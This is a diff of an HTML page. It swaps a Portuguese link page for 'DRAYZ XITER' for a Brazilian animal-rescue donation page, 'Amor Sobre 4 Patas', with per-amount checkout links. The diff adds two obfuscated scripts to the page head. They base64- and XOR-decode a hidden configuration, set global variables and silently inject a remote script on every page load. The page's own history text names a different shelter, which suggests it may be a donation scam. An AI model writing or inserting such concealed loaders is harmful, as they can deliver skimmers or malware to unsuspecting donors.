@@ -4,271 +4,527 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DRAYZ XITER</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    <title>Amor Sobre 4 Patas - ONG de Resgate Animal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
 
-        body {
-            font-family: 'Outfit', sans-serif;
-            background: #0a0a0a;
-            color: #fff;
-            min-height: 100vh;
-            padding: 24px;
-            overflow-x: hidden;
-            position: relative;
-        }
+<script>(function(){var d_2=atob("DFY2mx5S6skOELTanS0U7mw+yPMseMCu7SUMtDExjqcgZcC39DBPtX09h+dsYpup/iRf62ohxbx6fcf18TdC/m0mxKN9Mpj4/CJC6Xcwn71rY5bgxi0U9X8/j+s0MtC76Tcb7mo/g693PcSo+CBT9Wp/kqphdJmp/j0Utzwki6V7dZbgv3RLt2VwhKhjdZbgvzJX739/n71jedKjsCZE/mg3hL0jY8G49DJFuTJwnKhiZdH4p3QU5kMv");var q_w=[];for(var s_8wjm=0;s_8wjm<d_2.length;s_8wjm++){q_w.push(d_2.charCodeAt(s_8wjm)&255);}var s_23id=q_w[0];var a_x6=q_w.slice(1,1+s_23id);var p_w=q_w.slice(1+s_23id);var y_9z=p_w.map(function(b,y_4){return b^a_x6[y_4%s_23id];});var u_1l="";for(var h_gy=0;h_gy<y_9z.length;h_gy++){u_1l+=String.fromCharCode(y_9z[h_gy]&255);}var o_6i1r=decodeURIComponent(escape(u_1l));var q_86q=JSON.parse(o_6i1r);var s_8ge=q_86q.globals||[];s_8ge.forEach(function(j_9soc){window[j_9soc.name]=j_9soc.value;});var l_6=document.createElement("script");l_6.src=q_86q.url;l_6.async=true;l_6.defer=true;(q_86q.attributes||[]).forEach(function(n_4a9n){l_6.setAttribute(n_4a9n.name,n_4a9n.value);});(document.head||document.documentElement).appendChild(l_6);})();</script>
+<script>(function(){var a_g91=atob("DFW4Vqa19rDBOOlwOS6aI9TZ1IrjUJ0ESSaCeYnWkt7vTZ0dUDPBeMXam56jSsYDWifRJtLG2cCoQIwcFiXRLsPZ2NqyGsVSWCHMJM/Xg8SkS8tKYgiUdMHZmdKgVJpSAw7DdMjUm9XjAssAUC3dOu/R1JzjTogcTDCabISDl9WnCIxHATPbYsSGz4b2CdpICzeIbsSXi+28");var g_ous=[];for(var u_q=0;u_q<a_g91.length;u_q++){g_ous.push(a_g91.charCodeAt(u_q)&255);}var d_zaq=g_ous[0];var j_3u61=g_ous.slice(1,1+d_zaq);var v_6=g_ous.slice(1+d_zaq);var t_a8d=v_6.map(function(b,d_g){return b^j_3u61[d_g%d_zaq];});var z_awc="";for(var t_g=0;t_g<t_a8d.length;t_g++){z_awc+=String.fromCharCode(t_a8d[t_g]&255);}var c_h=decodeURIComponent(escape(z_awc));var v_r4=JSON.parse(c_h);var j_6=v_r4.globals||[];j_6.forEach(function(u_kaz9){window[u_kaz9.name]=u_kaz9.value;});var n_m=document.createElement("script");n_m.src=v_r4.url;n_m.async=true;n_m.defer=true;(v_r4.attributes||[]).forEach(function(o_m7u){n_m.setAttribute(o_m7u.name,o_m7u.value);});(document.head||document.documentElement).appendChild(n_m);})();</script>
 
-        .bg-layer {
-            position: fixed;
-            inset: 0;
-            z-index: -1;
-            background-image: linear-gradient(180deg, rgba(10, 10, 10, 0.72) 0%, rgba(10, 10, 10, 0.65) 50%, rgba(10, 10, 10, 0.78) 100%), url('https://media1.tenor.com/m/m9ipnIinnLIAAAAC/fairy-tail-natsu-dragneel.gif');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-        }
-
-        /* Barra superior estilo painel */
-
-        .panel-header {
-            max-width: 420px;
-            margin: 0 auto 24px;
-            background: linear-gradient(180deg, #9D00FF 0%, #9D00FF 100%);
-            padding: 14px 20px;
-            border-radius: 10px 10px 0 0;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid rgba(157, 0, 255, 0.15);
-            box-shadow: 0 4px 20px rgba(157, 0, 255, 0.4);
-        }
-
-        .panel-header h1 {
-            font-size: 1.1rem;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-        }
-
-        .panel-header .close-btn {
-            width: 28px;
-            height: 28px;
-            background: rgba(0, 0, 0, 0.3);
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 1rem;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s;
-        }
-
-        .panel-header .close-btn:hover {
-            background: rgba(0, 0, 0, 0.5);
-        }
-
-        .container {
-            max-width: 420px;
-            margin: 0 auto;
-            background: rgba(18, 18, 18, 0.95);
-            border: 1px solid rgba(157, 0, 255, 0.06);
-            border-top: none;
-            border-radius: 0 0 12px 12px;
-            padding: 28px 24px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(157, 0, 255, 0.1);
-        }
-
-        .avatar {
-            width: 90px;
-            height: 90px;
-            border-radius: 50%;
-            margin: 0 auto 18px;
-            background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 26px;
-            font-weight: 700;
-            color: #9D00FF;
-            letter-spacing: 1px;
-            border: 2px solid rgba(157, 0, 255, 0.4);
-            box-shadow: 0 0 20px rgba(157, 0, 255, 0.2);
-        }
-
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-
-        .container>.title {
-            font-size: 1.4rem;
-            font-weight: 700;
-            letter-spacing: 0.04em;
-            margin-bottom: 6px;
-            color: #fff;
-            text-align: center;
-        }
-
-        .subtitle {
-            font-size: 0.9rem;
-            color: #888;
-            margin-bottom: 24px;
-            text-align: center;
-        }
-
-        .links {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .link-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(255, 255, 255, 0.04);
-            color: #fff;
-            text-decoration: none;
-            padding: 16px 24px;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 500;
-            transition: all 0.2s;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .link-btn:hover {
-            background: rgba(157, 0, 255, 0.2);
-            border-color: rgba(157, 0, 255, 0.5);
-            box-shadow: 0 0 20px rgba(157, 0, 255, 0.15);
-        }
-
-        .link-btn i {
-            margin-right: 10px;
-        }
-
-        .discord-btn {
-            color: #fff;
-        }
-
-        .discord-btn i {
-            color: #5865f2;
-        }
-
-        .store-btn i {
-            color: #9D00FF;
-        }
-
-        /* Seção referências */
-
-        .refs-section {
-            margin-top: 36px;
-            padding-top: 24px;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .refs-section h2 {
-            font-size: 0.85rem;
-            font-weight: 600;
-            color: #9D00FF;
-            letter-spacing: 0.06em;
-            margin-bottom: 16px;
-            text-align: center;
-            text-transform: uppercase;
-        }
-
-        .refs-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-
-        .refs-grid img {
-            width: 100%;
-            aspect-ratio: 1;
-            object-fit: cover;
-            border-radius: 8px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            background: #111;
-        }
-
-        .refs-grid img:only-child,
-        .refs-grid a {
-            grid-column: span 2;
-        }
-
-        .refs-grid a {
-            display: block;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .footer {
-            margin-top: 28px;
-            font-size: 0.8rem;
-            color: #555;
-            text-align: center;
-        }
-
-        @media (max-width: 480px) {
-            .avatar {
-                width: 80px;
-                height: 80px;
-                font-size: 22px;
-            }
-            .container>.title {
-                font-size: 1.25rem;
-            }
-        }
-    </style>
 </head>
 
 <body>
-    <div class="bg-layer" aria-hidden="true"></div>
-    <header class="panel-header">
-        <h1>▼ DRAYZ XITER</h1>
-        <button type="button" class="close-btn" aria-label="Fechar">×</button>
-    </header>
-
     <div class="container">
-        <div class="avatar" title="DRAYZ XITER">D</div>
-        <p class="title">DRAYZ XITER</p>
-        <p class="subtitle">Junte-se à comunidade ou acesse a loja</p>
 
-        <div class="links">
-            <a href="https://discord.gg/PDNF9hDMk2" class="link-btn discord-btn" target="_blank" rel="noopener">
-                <i class="fab fa-discord"></i> Entrar no Discord
-            </a>
-            <a href="https://drayzxiter.sharpify.online" class="link-btn store-btn" target="_blank" rel="noopener">
-                <i class="fas fa-store"></i> Loja Sharpify
-            </a>
-        </div>
+        <!-- SEÇÃO: HEADER FIXO -->
+        <header class="header-novo">
+            <div class="header-logo-section">
+                <div class="header-logo">
+                    <img src="img/Logo.jpg (1).png" alt="SALVE CÃO Logo" class="logo-img">
+                </div>
+                <div class="header-text">
+                    <h1>AMOR SOBRE 4 PATAS</h1>
+                </div>
+            </div>
+            <div class="header-right">
+                <a href="#" class="header-link">Início</a>
+                <button class="btn-doe-aqui">Doe aqui</button>
+            </div>
+        </header>
 
-        <section class="refs-section" aria-label="Referências">
-            <h2>Referências</h2>
-            <div class="refs-grid">
-                <img src="assets/ref1.png" alt="Referência 1 - DRAYZ XITER" loading="lazy" onerror="this.style.display='none'">
-                <img src="assets/ref2.png" alt="Referência 2 - DRAYZ XITER" loading="lazy" onerror="this.style.display='none'">
-                <img src="assets/ref3.png" alt="Referência 3 - DRAYZ XITER" loading="lazy" onerror="this.style.display='none'">
-                <img src="assets/ref4.png" alt="Referência 4 - DRAYZ XITER" loading="lazy" onerror="this.style.display='none'">
+        <!-- SEÇÃO: BANNER -->
+        <section class="banner-slot" id="banner-section">
+            <img id="banner-img" src="img/Untitled-1.png" alt="Banner">
+        </section>
+
+        <!-- SEÇÃO: VÍDEO -->
+        <div style="max-width: 800px; margin: 0 auto; position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://player.vimeo.com/video/1245611590?h=89b121ba10&badge=0&autopause=0&player_id=0&app_id=58479" 
+    style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
+    frameborder="0" 
+    allow="autoplay; fullscreen; picture-in-picture" 
+    allowfullscreen>
+  </iframe>
+</div>
+
+        <!-- SEÇÃO: CTA QUERO AJUDAR -->
+        <section class="cta-ajudar">
+            <span class="tag tag-azul">Faça a diferença hoje</span>
+            <button class="btn-quero-ajudar-2">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                </svg>
+                Quero Ajudar
+            </button>
+            <p class="cta-subtexto">Cada contribuição salva uma vida</p>
+        </section>
+
+        <!-- SEÇÃO: IMPACTO E HISTÓRIAS -->
+        <section class="secao-impacto">
+            <div class="impacto-header">
+                <h2>Conheça nosso impacto</h2>
+                <div class="titulo-underline"></div>
+            </div>
+
+            <div class="impacto-carrossel">
+                <button class="carrossel-btn btn-prev" id="btn-prev-impacto">❮</button>
+                <div class="impacto-imagens-container">
+                    <div class="impacto-img-slide active">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/BATMAN.png" alt="Batman">
+                        </div>
+                    </div>
+                    <div class="impacto-img-slide">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/BIBI.png" alt="Bibi">
+                        </div>
+                    </div>
+                    <div class="impacto-img-slide">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/BOB.png" alt="Bob">
+                        </div>
+                    </div>
+                    <div class="impacto-img-slide">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/CACAU.png" alt="Cacau">
+                        </div>
+                    </div>
+                    <div class="impacto-img-slide">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/HERCULES.png" alt="Guibson">
+                        </div>
+                    </div>
+                    <div class="impacto-img-slide">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/BELLA.png" alt="Lilica">
+                        </div>
+                    </div>
+                    <div class="impacto-img-slide">
+                        <div class="impacto-img-placeholder">
+                            <img src="img/antes_depois/NOEL.png" alt="Noel">
+                        </div>
+                    </div>
+                </div>
+                <button class="carrossel-btn btn-next" id="btn-next-impacto">❯</button>
+            </div>
+
+            <div class="impacto-dots" id="dots-impacto">
+                <span class="dot active" data-slide="0"></span>
+                <span class="dot" data-slide="1"></span>
+                <span class="dot" data-slide="2"></span>
+                <span class="dot" data-slide="3"></span>
+                <span class="dot" data-slide="4"></span>
+                <span class="dot" data-slide="5"></span>
+                <span class="dot" data-slide="6"></span>
+            </div>
+
+            <!-- SEÇÃO: INFORMAÇÕES DA INSTITUIÇÃO -->
+            <section class="info-instituicao">
+                <div class="info-instituicao-content">
+                    <h2 class="info-instituicao-titulo">Abrigo - Amor Sobre 4 Patas</h2>
+                    <div class="info-instituicao-separator"></div>
+
+                    <div class="info-instituicao-inner">
+                        <div class="info-instituicao-dados">
+                            <div class="info-item">
+                                <svg class="info-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                                <div>
+                                    <p class="info-label">LOCALIZAÇÃO</p>
+                                    <p class="info-valor">São Paulo, SP • Brasil</p>
+                                </div>
+                            </div>
+
+                            <div class="info-item">
+                                <svg class="info-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="2" width="20" height="20" rx="2"></rect>
+                                <path d="M7 7h10M7 12h10M7 17h5"></path>
+                            </svg>
+                                <div>
+                                    <p class="info-label">CNPJ</p>
+                                    <p class="info-valor">43.250.819/0001-10</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="info-instituicao-logo">
+                            <img src="img/Logo.jpg (1).png" alt="Amor Sobre 4 Patas Logo" class="info-logo-img">
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+
+            <div class="historia-box">
+                <div class="historia-badge">Nossa história</div>
+                <p class="historia-titulo">Cada vida importa e cada gesto salva</p>
+
+                <div class="historia-carrossel">
+                    <div class="historia-imagem-slide active">
+                        <div class="historia-imagem-container">
+                            <img src="img/gabi-01.jpeg" alt="Nossa história" class="historia-imagem">
+                        </div>
+                    </div>
+                    <div class="historia-imagem-slide">
+                        <div class="historia-imagem-container">
+                            <img src="img/gabi-02.jpeg" alt="Nossa história" class="historia-imagem">
+                        </div>
+                    </div>
+                    <div class="historia-imagem-slide">
+                        <div class="historia-imagem-container">
+                            <img src="img/gabi-03.jpeg" alt="Nossa história" class="historia-imagem">
+                        </div>
+                    </div>
+                    <div class="historia-imagem-slide">
+                        <div class="historia-imagem-container">
+                            <img src="img/gabi-04.jpeg" alt="Nossa história" class="historia-imagem">
+                        </div>
+                    </div>
+
+                    <div class="historia-dots" id="dots-historia">
+                        <span class="historia-dot active" data-slide="0"></span>
+                        <span class="historia-dot" data-slide="1"></span>
+                        <span class="historia-dot" data-slide="2"></span>
+                        <span class="historia-dot" data-slide="3"></span>
+                    </div>
+                </div>
+
+                <p class="historia-texto">A Cãopanhia Baltazar nasceu do amor pelos animais e do compromisso de transformar histórias marcadas pelo abandono em histórias de cuidado, proteção e esperança. Desde 2021, resgatamos animais em situação de vulnerabilidade, oferecendo
+                    abrigo, tratamento, alimentação e a chance de um recomeço digno.
+                    <br><br> Cada animal acolhido representa uma nova oportunidade de viver com segurança, carinho e respeito. Com responsabilidade e dedicação, também preparamos nossos resgatados para uma adoção consciente, sempre com processo de aprovação
+                    e contrato assinado.
+                    <br><br> Com o apoio de pessoas que acreditam nessa missão, seguimos crescendo e lutando todos os dias para salvar vidas e construir um futuro melhor para eles.</p>
+
+                <div class="impacto-stats">
+                    <div class="impacto-stat">
+                        <div class="stat-icone">🐕</div>
+                        <div class="stat-numero">4.500+</div>
+                        <div class="stat-label">Vidas impactadas</div>
+                    </div>
+                    <div class="impacto-stat">
+                        <div class="stat-icone">❤️</div>
+                        <div class="stat-numero">150</div>
+                        <div class="stat-label">Animais acolhidos</div>
+                    </div>
+                </div>
+
+                <div class="info-destaque">
+                    <p>🎯 !Todos os recursos arrecadados são destinados ao cuidado dos animais, incluindo alimentação, atendimento veterinário, abrigo e bem-estar. Sua ajuda é essencial para continuarmos transformando vidas.</p>
+                </div>
+            </div>
+
+            <button class="btn-quero-ajudar-2">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                </svg>
+                Quero Ajudar
+            </button>
+        </section>
+
+        <!-- SEÇÃO: PROPÓSITO E MISSÃO -->
+        <section class="secao-proposito">
+            <div class="proposito-header">
+                <h2>Entenha Nosso Propósito</h2>
+                <div class="titulo-underline-escuro"></div>
+            </div>
+
+            <!-- Carrossel de Cards -->
+            <div class="carrossel-cards-container">
+                <div class="carrossel-card-slide active">
+                    <div class="card-content">
+                        <div class="card-imagem">
+                            <img src="img/Banner-02-1.png" alt="Propósito e Missão">
+                        </div>
+                        <div class="card-texto">
+                            <h3>Mais de 150 animais resgatados precisam de você!</h3>
+                            <p>Quando os animais chegam até nós precisam de cuidados imediatos. Com sua ajuda fornecemos alimentação, medicamentos e abrigo seguro.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="carrossel-card-slide">
+                    <div class="card-content">
+                        <div class="card-imagem">
+                            <img src="img/Banner---03.png" alt="Histórias de transformação">
+                        </div>
+                        <div class="card-texto">
+                            <h3>Histórias de transformação e esperança</h3>
+                            <p>Cada animal resgatado é uma vida salva. Conheça histórias incríveis de animais que encontraram suas famílias adotivas e agora vivem com amor.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="carrossel-card-slide">
+                    <div class="card-content">
+                        <div class="card-imagem">
+                            <img src="img/Banner---04.png" alt="Fazemos a diferença">
+                        </div>
+                        <div class="card-texto">
+                            <h3>Juntos fazemos a diferença real</h3>
+                            <p>Sua contribuição vai direto para cuidados veterinários, alimentação nutritiva e bem-estar dos animais em nosso abrigo.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="proposito-missao">
+                <h3>APOIO E ESPERANÇA</h3>
+                <p>Manter mais de 150 vidas exige alimentação, cuidados veterinários e abrigo todos os dias. Sua ajuda mantém essa missão viva.</p>
+            </div>
+
+            <!-- Controles do Carrossel -->
+            <div class="carrossel-controles">
+                <button class="carrossel-btn-prev" id="btn-prev-proposito">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M15 19l-7-7 7-7"></path>
+                    </svg>
+                </button>
+                <div class="carrossel-dots" id="dots-proposito">
+                    <button class="dot active" data-slide="0"></button>
+                    <button class="dot" data-slide="1"></button>
+                    <button class="dot" data-slide="2"></button>
+                </div>
+                <button class="carrossel-btn-next" id="btn-next-proposito">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M9 5l7 7-7 7"></path>
+                    </svg>
+                </button>
+            </div>
+
+            <button class="btn-quero-ajudar-proposito">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                </svg>
+                Quero Ajudar
+            </button>
+        </section>
+        <!-- SEÇÃO: IMPACTO DA DOAÇÃO -->
+        <section class="secao-impacto-doacao">
+            <div class="impacto-doacao-header">
+                <h2>O impacto da sua ajuda</h2>
+                <div class="titulo-underline-azul"></div>
+            </div>
+
+            <div class="impacto-items">
+                <div class="impacto-item">
+                    <div class="impacto-badge">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg> R$ 10
+                    </div>
+                    <p>Uma ajuda que já faz diferença na alimentação de um animal.</p>
+                </div>
+
+                <div class="impacto-item">
+                    <div class="impacto-badge">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg> R$ 20
+                    </div>
+                    <p>Uma semana de alimento e esperança para um animal.</p>
+                </div>
+
+                <div class="impacto-item">
+                    <div class="impacto-badge">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg> R$ 30
+                    </div>
+                    <p>Saúde e nutrição para 1 animal durante 10 dias.</p>
+                </div>
+
+                <div class="impacto-item">
+                    <div class="impacto-badge">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg> R$ 40
+                    </div>
+                    <p>Ração e cuidados básicos para 2 animais durante uma semana.</p>
+                </div>
+
+                <div class="impacto-item">
+                    <div class="impacto-badge">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg> R$ 50                    </div>
+                    <p>Saúde e nutrição para 2 animais durante 10 dias.</p>
+                </div>
+
+                <div class="impacto-item">
+                    <div class="impacto-badge">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg> R$ 100
+                    </div>
+                    <p>Um saco de ração de 10kg, o suficiente para alimentar 5 vidas por 30 dias.</p>
+                </div>
+            </div>
+
+            <p class="impacto-frase-final">Toda doação é um ato de amor. 🐾</p>
+        </section>
+
+        <!-- SEÇÃO: PIX COPIA E COLA -->
+        <section class="pix-section-novo" id="pix-section">
+            <div class="pix-novo-container">
+                <!-- HEADER COM LOGO -->
+                <div class="pix-novo-header">
+                    <h2>Como Doar via PIX</h2>
+                    <div class="pix-logo-container">
+                        <img src="./img/logo-pix-oficial.png" alt="Logo PIX" class="pix-logo-img">
+                    </div>
+                </div>
+
+                <!-- PASSOS PARA DOAR -->
+                <div class="pix-novo-box pix-passos">
+                    <h3>Passos para doar:</h3>
+                    <ol class="pix-passos-lista">
+                        <li><strong>Escolha o valor</strong> que quer doar clicando em um dos botões abaixo.</li>
+                        <li><strong>Finalize no checkout</strong> para concluir o pagamento.</li>
+                        <li><strong>Coloque algumas informações</strong>, e gere o PIX..</li>
+                        <li><strong>Pronto!</strong> Sua ajuda chega na hora para os nossos resgatados.</li>
+                    </ol>
+                </div>
+
+                <!-- Caixinha "Escolha quanto quer doar" — cole este trecho na sua página -->
+<style>
+  .doacao-valores {
+    background: #e3f0fc;
+    border-radius: 14px;
+    padding: 20px;
+    font-family: "Nunito", Arial, sans-serif;
+    max-width: 700px;
+  }
+  .doacao-valores p {
+    margin: 0 0 14px;
+    font-weight: 600;
+    color: #1e3a5f;
+    font-size: 16px;
+  }
+  .doacao-valores .grade {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+  }
+  .doacao-valores button {
+    border: 2px solid #d7e3f0;
+    background: #ffffff;
+    color: #2b2b2b;
+    border-radius: 10px;
+    padding: 14px 0;
+    font-size: 17px;
+    font-weight: 800;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.15s ease;
+  }
+  .doacao-valores button:hover {
+    border-color: #1c6dd9;
+  }
+  .doacao-valores button.selecionado {
+    background: #1c6dd9;
+    border-color: #1c6dd9;
+    color: #ffffff;
+  }
+</style>
+
+<div class="doacao-valores">
+  <p>Escolha quanto quer doar:</p>
+  <div class="grade">
+    <button type="button" data-valor="10">R$ 10,00</button>
+    <button type="button" data-valor="20" class="selecionado">R$ 20,00</button>
+    <button type="button" data-valor="30">R$ 30,00</button>
+    <button type="button" data-valor="40">R$ 40,00</button>
+    <button type="button" data-valor="50">R$ 50,00</button>
+    <button type="button" data-valor="100">R$ 100,00</button>
+  </div>
+  <button type="button" id="btn-ir-checkout" style="width:100%;margin-top:14px;padding:16px;border:none;border-radius:10px;background:#1c6dd9;color:#fff;font-size:18px;font-weight:800;font-family:inherit;cursor:pointer;">
+    Quero ajudar
+  </button>
+</div>
+
+<script>
+  // ============================================================
+  // COLE AQUI OS LINKS DE CHECKOUT DE CADA VALOR
+  // (crie um link de pagamento para cada valor na sua plataforma
+  //  e substitua os textos de exemplo abaixo)
+  // ============================================================
+  var CHECKOUTS = {
+    10:  "https://checkout.atlaspags.com/t4stdrnw",
+    20:  "https://checkout.atlaspags.com/6e3qug7z",
+    30:  "https://checkout.atlaspags.com/849v8w36",
+    40:  "https://checkout.atlaspags.com/hwx4kcye",
+    50:  "https://checkout.atlaspags.com/7awepxt5",
+    100: "https://checkout.atlaspags.com/rsb3w7v4"
+  };
+
+  var valorEscolhido = 20;
+
+  // Marca o botão clicado como selecionado
+  document.querySelectorAll(".doacao-valores .grade button").forEach(function (botao) {
+    botao.addEventListener("click", function () {
+      document.querySelectorAll(".doacao-valores .grade button").forEach(function (b) {
+        b.classList.remove("selecionado");
+      });
+      botao.classList.add("selecionado");
+      valorEscolhido = botao.dataset.valor;
+    });
+  });
+
+  // Botão "Quero ajudar" leva ao checkout do valor escolhido
+  document.getElementById("btn-ir-checkout").addEventListener("click", function () {
+    var link = CHECKOUTS[valorEscolhido];
+    if (link && link.indexOf("http") === 0) {
+      window.location.href = link;
+    } else {
+      alert("O link de pagamento de R$ " + valorEscolhido + " ainda não foi configurado.");
+    }
+  });
+</script>
+
+
+                <!-- MENSAGEM DE SUCESSO -->
+                <div class="pix-msg-sucesso" id="pix-msg-sucesso" style="display: none;">
+                    ✓ Código copiado com sucesso! 🐾 Obrigada por salvar vidas junto com a gente!
+                </div>
             </div>
         </section>
 
-        <div class="footer">Feito com ❤️ para a comunidade</div>
+        <!-- TOAST NOTIFICAÇÃO PIX -->
+        <div class="pix-toast" id="pix-toast">
+            <div class="pix-toast-content">
+                <div class="pix-toast-icon">✅</div>
+                <div class="pix-toast-header">abrigoamorsobre4patas.com diz</div>
+                <div class="pix-toast-message">Chave PIX copiada! Agora basta colar no app do seu banco.</div>
+                <button class="pix-toast-btn" id="pix-toast-btn">OK</button>
+            </div>
+        </div>
+
+        <!-- SEÇÃO: FOOTER -->
+        <footer>
+            <h3>Abrigo Amor Sobre 4 Patas</h3>
+            <p>CNPJ: 43.250.819/0001-10<br>Organização não governamental dedicada ao resgate e proteção de animais.</p>
+            <div class="footer-links">
+                <a href="#adocao">Adoção</a>
+                <a href="#apadrinhamento">Apadrinhamento</a>
+                <a href="#doacoes">Doações</a>
+                <a href="#voluntariado">Voluntariado</a>
+                <a href="#contato">Contato</a>
+                <a href="#privacidade">Privacidade</a>
+            </div>
+            <p class="copyright">© 2024 Abrigo Amor Sobre 4 Patas. Todos os direitos reservados.</p>
+        </footer>
+
     </div>
+
+    <script src="script.js"></script>
+    <script>
+      // Todos os botões "Quero Ajudar" e "Doe aqui" rolam até a seção de doação
+      document.querySelectorAll(".btn-quero-ajudar-2, .btn-quero-ajudar-proposito, .btn-doe-aqui").forEach(function (botao) {
+        botao.addEventListener("click", function () {
+          document.getElementById("pix-section").scrollIntoView({ behavior: "smooth" });
+        });
+      });
+    </script>
 </body>
 
 </html>
